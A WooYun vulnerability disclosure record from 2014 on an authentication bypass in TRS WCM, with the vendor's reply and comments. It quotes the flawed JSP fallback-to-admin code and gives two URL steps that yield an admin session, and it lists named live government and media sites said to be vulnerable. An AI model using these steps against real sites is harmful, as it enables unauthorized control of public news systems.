{"id": 2141, "wybug_id": "wooyun-2014-060994", "wybug_title": "TRS认证漏洞可登陆后台操作任意站群", "wybug_corp": "北京拓尔思信息技术股份有限公司", "wybug_author": "路人甲", "wybug_date": "2014-05-16 16:10", "wybug_open_date": "2014-08-14 16:12", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向公众公开  简要描述：  详细说明：  TRS WCM 后台绕过控制站群系统通过该漏洞，可直接登录后台操作任意站群。。。此系统多为大型政府新闻发布站点（新闻源），如一旦被某些（博彩集团）控制，估计后果危害不是一般大。。。http://123.131.133.150:8080/wcm/  临沂日报报业集团http://61.153.63.94/wcm 云和县政府所有发布站点http://www.cflac.org.cn/wcm   中国文联http://wcm.xxz.gov.cn:8080/wcm/  湘西州政府站群http://www.jscnt.gov.cn/wcm/   江苏省文化厅http://www.sccnt.gov.cn     四川省文化厅http://218.94.123.203/wcm    江苏长安网http://203.86.89.25/wcm/   中国书籍出版社http://www.lfcgs.gov.cn:8080/wcm/   廊坊车管所http://iwr.cass.cn/wcm/    中国社会科学院http://www.whxinzhou.gov.cn:9090/wcm/   新洲区人民政府公众网http://123.131.133.150:8080/wcm/   琅琊网http://122.224.174.82:8090/wcm/   中国美术学院http://www.qhepb.gov.cn   青海省环保厅http://211.154.254.113:8080/wcm/  佛教在线……..还有很多，我就不统计了。在/design_for_interview.jsp中.....//省略若干代码\nint nUserKey = 0;try{     nUserKey = Integer.valueOf(sUserKey);}catch(Exception ex) {}User loginUser = User.findById(nUserKey);if(loginUser == null) {  //loinguser为空的情况下，接下来直接赋值loginuser登录名为:admin      loginUser = User.findByName(\"admin\");}if(loginUser == null) {      loginUser = User.getSystem();{ContextHelper.clear();ContextHelper.initContext(loginUser);request.getSession().setAttribute(LoginHelper.SESSION_NAME_USER,loginUser.getkey()); //直接获取session值传入给admin,至少访问一次之后就获得一个admin的session值了，至此可以直接访问后台文件，任意操作了\nexp 如下：先访问：www.site.com/wcm/app/special/design_for_interview.jsp再访问：www.site.com/wcm/app/main.jsp第一步：\n\n第二步：\n\n随意操作任何站点，发布新闻，获取shell都即可。\n\n   漏洞证明：  随意操作任何站点（控制站群），发布新闻，获取shell都即可。\n\n   修复方案：  这个。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-05-21 14:13 厂商回复： CNVD确认漏洞非首报，且经过上次处置，拓尔思公司已经提供修复补丁，已经将相关案例转发给软件生产厂商——拓尔思公司，由其后联系处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-16 19:32 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  3月的补丁？    \n     2014-05-21 11:45 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  这个已经是老漏洞了。主要是相关案例未修补。    \n     2014-08-14 16:24 |    \t\t神笔马良 \t\t\t( 普通白帽子  |\t\t\t        Rank:130 漏洞数:45        | 爱写字的马)\t\t \n  @cncert国家互联网应急中心 我再报给不给我rank啊    \n     2014-08-14 17:33 |    \t\tCoffeeSafe \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:37        )\t\t \n  未修复是白帽子的错吗？    \n     2014-08-15 10:15 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  3月2日那天，wooyun还没有匿名提交。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}